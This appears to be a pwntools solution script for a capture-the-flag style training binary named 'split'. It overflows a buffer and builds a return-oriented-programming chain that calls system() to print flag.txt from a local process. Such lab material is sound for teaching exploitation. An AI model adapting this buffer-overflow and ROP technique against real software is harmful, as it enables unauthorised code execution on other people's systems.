from pwn import *

elf = context.binary = ELF('./split', checksec= False)
p = process()

padding = 40

bincatAddress = next(elf.search(b'/bin/cat'))

rop = ROP(elf)

rop.system(bincatAddress) # create a ROP chain calling system("/bin/cat flag.txt")

pprint(rop.gadgets)

info(rop.dump())

payload = fit({
	padding: rop.chain()
})

p.sendlineafter('>', payload)
p.recvuntil('Thank you!\n')

flag = p.recv()
success(flag)

